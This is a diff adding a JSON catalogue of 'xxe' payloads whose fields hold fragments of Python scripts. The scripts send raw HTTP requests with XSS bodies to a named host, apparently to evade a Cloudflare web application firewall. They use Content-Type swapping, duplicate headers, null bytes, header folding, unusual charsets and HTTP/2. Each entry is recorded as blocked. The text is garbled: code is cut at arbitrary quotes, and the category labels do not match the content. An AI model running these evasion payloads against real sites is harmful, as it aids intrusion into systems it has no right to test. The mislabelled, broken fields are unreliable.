@@ -1,0 +1,49 @@
+{
+  "category": "xxe",
+  "subcategory": "general",
+  "count": 3,
+  "payloads": [
+    {
+      "id": "xxe-0001",
+      "category": "xxe",
+      "subcategory": "general",
+      "payload": "json-large-100KB\",\n    b\"POST / HTTP/1.1\r\n\"\n    b\"Host: waf.cumulusfire.net\r\n\"\n    b\"Content-Type: application/json\r\n\"\n    b\"Content-Length: \" + str(len(large_json)).encode() + b\"\r\n\"\n    b\"Connection: close\r\n\r\n\"\n    + large_json.encode())\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"34E: XML Body with XSS (CDATA, Entities)\")\nprint(\"=\" * 75 + \"\n\")\n\nxml_payloads = [\n    f'<?xml version=\"1.0\"?><root><globalHtml>{XSS}</globalHtml></root>',\n    f'<?xml version=\"1.0\"?><root><globalHtml><![CDATA[{XSS}]]></globalHtml></root>',\n    f'<?xml version=\"1.0\" encoding=\"UTF-16\"?><root><globalHtml>{XSS}</globalHtml></root>',\n]\n\nfor i, body in enumerate(xml_payloads):\n    raw_req(f\"xml-{i}\",\n        b\"POST / HTTP/1.1\r\n\"\n        b\"Host: waf.cumulusfire.net\r\n\"\n        b\"Content-Type: application/xml\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\"\n        + body.encode())\n    time.sleep(0.3)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"34F: text/plain Content-Type (WAF Might Skip Form Parsing)\")\nprint(\"=\" * 75 + \"\n\")\n\n# If Content-Type isn't form-urlencoded, WAF might skip param parsing\n# But origin might still parse it\n\nfor ct in ['text/plain",
+      "description": "text/html', 'application/octet-stream',\n           'multipart/mixed', 'text/xml', '', 'x-custom/type",
+      "technique": "direct_injection",
+      "source_file": "waf_round34_desync.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xxe-0002",
+      "category": "xxe",
+      "subcategory": "general",
+      "payload": "utf-8', errors='replace')\n        raw_req(\n            b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n            b\"Content-Type: \" + ct.encode() + b\"\r\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + body)\n\n# C11: Newline before Content-Type (WAFFLED finding)\nfor xss in [XSS_SHORT]:\n    body = f'<?xml version=\"1.0\"?><root><globalHtml>{xss}</globalHtml></root>'.encode()\n    raw_req(\n        b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n        b\"\r\nContent-Type: application/xml\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\" + body)\n\nprint(f\"  XML done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# D. CONTENT-TYPE HEADER TRICKS\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- D: Content-Type Header Tricks ---\")\n\npayload_body = f\"globalHtml={urllib.parse.quote(XSS_SHORT)}\".encode()\n\n# D1: No Content-Type header at all\nraw_req(\n    b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\r\n\"\n    b\"Connection: close\r\n\r\n\" + payload_body)\n\n# D2: Content-Type with extra parameters\nfor ct in [\n    'application/x-www-form-urlencoded; charset=utf-7",
+      "description": "application/x-www-form-urlencoded; charset=utf-16',\n    'application/x-www-form-urlencoded; charset=utf-32',\n    'application/x-www-form-urlencoded; charset=iso-2022-jp',\n    'application/x-www-form-urlencoded; charset=euc-jp',\n    'application/x-www-form-urlencoded; charset=shift_jis',\n    'application/x-www-form-urlencoded; charset=windows-31j',\n    'application/x-www-form-urlencoded; boundary=fake',\n]:\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D3: Duplicate Content-Type headers\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: text/plain\\r\\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n    b\"Content-Type: text/plain\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D4: Content-Type with null byte\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\\x00\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D5: Content-Type with line folding (obsolete but some parsers accept)\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: application/\\r\\n x-www-form-urlencoded\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D6: Content-Type case variations\nfor ct in ['APPLICATION/X-WWW-FORM-URLENCODED', 'Application/X-Www-Form-Urlencoded',\n           'APPLICATION/JSON', 'Application/Json",
+      "technique": "encoding",
+      "source_file": "waf_round81_waffled.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xxe-0003",
+      "category": "xxe",
+      "subcategory": "general",
+      "payload": ":authority', HOST),\n        ]\n        h2_request(headers, label=\"attrHtml\")\n\n    print(f\"  HTTP/2 done: {total} total\")\n\nexcept ImportError:\n    print(\"  h2 not available, skipping HTTP/2 tests\")\nexcept Exception as e:\n    print(f\"  HTTP/2 error: {e}\")\n    print(f\"  HTTP/2 partial: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# B. CONTENT-TYPE INTERCHANGEABILITY (Technique #8, WAFFLED key)\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- B: Content-Type Interchangeability ---\")\n\n# WAFFLED key finding: many frameworks parse both multipart and urlencoded\n# using the same API. Send multipart body with urlencoded Content-Type and vice versa.\n\nCT_INTERCHANGE = [\n    # Send urlencoded body with multipart CT\n    (\"multipart/form-data; boundary=none\", f\"globalHtml={urllib.parse.quote(XSS_S)}\".encode()),\n    # Send multipart body with urlencoded CT\n    (\"application/x-www-form-urlencoded\",\n     f\"--bound\r\nContent-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n{XSS_S}\r\n--bound--\r\n\".encode()),\n    # Send JSON body with urlencoded CT\n    (\"application/x-www-form-urlencoded\", json.dumps({\"globalHtml\": XSS_S}).encode()),\n    # Send urlencoded body with JSON CT\n    (\"application/json\", f\"globalHtml={urllib.parse.quote(XSS_S)}\".encode()),\n    # Send JSON body with multipart CT\n    (\"multipart/form-data; boundary=jsonbound\", json.dumps({\"globalHtml\": XSS_S}).encode()),\n    # Send multipart body with JSON CT\n    (\"application/json\",\n     f\"--jbound\r\nContent-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n{XSS_S}\r\n--jbound--\r\n\".encode()),\n    # Send urlencoded body with XML CT\n    (\"application/xml\", f\"globalHtml={urllib.parse.quote(XSS_S)}\".encode()),\n    # Send XML body with urlencoded CT\n    (\"application/x-www-form-urlencoded\",\n     f'<?xml version=\"1.0\"?><root><globalHtml>{XSS_S}</globalHtml></root>'.encode()),\n    # Send JSON body with text/plain\n    (\"text/plain\", json.dumps({\"globalHtml\": XSS_S}).encode()),\n    # Send urlencoded body with text/plain\n    (\"text/plain\", f\"globalHtml={urllib.parse.quote(XSS_S)}\".encode()),\n    # Send multipart body with text/plain\n    (\"text/plain\",\n     f\"--tpbound\r\nContent-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n{XSS_S}\r\n--tpbound--\r\n\".encode()),\n    # No content-type at all\n    (\"\", f\"globalHtml={urllib.parse.quote(XSS_S)}\".encode()),\n    (\"\", json.dumps({\"globalHtml\": XSS_S}).encode()),\n]\n\nfor xss in [XSS_S, XSS_IMG, XSS]:\n    for ct, body_template in CT_INTERCHANGE:\n        body = body_template.replace(XSS_S.encode(), xss.encode()) if isinstance(body_template, bytes) else body_template\n        if ct:\n            post_raw(body, ct=ct, label=f\"interchange-{ct[:20]}\")\n        else:\n            raw_req(\n                b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n                b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n                b\"Connection: close\r\n\r\n\" + body,\n                label=\"no-ct\")\n\nprint(f\"  CT interchange done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\n# C. GRAMMAR-BASED CONTENT-TYPE EDGE CASE FUZZING (Technique #9)\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- C: Grammar-Based Edge Case Fuzzing ---\")\n\n# C1: URL-encoded edge cases\nURLENC_EDGES = []\nfor xss in [XSS_S, XSS_IMG]:\n    enc = urllib.parse.quote(xss, safe='')\n    URLENC_EDGES.extend([\n        # Plus instead of %20\n        f\"globalHtml={enc.replace('%20",
+      "description": "+",
+      "technique": "direct_injection",
+      "source_file": "waf_round86_advanced.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
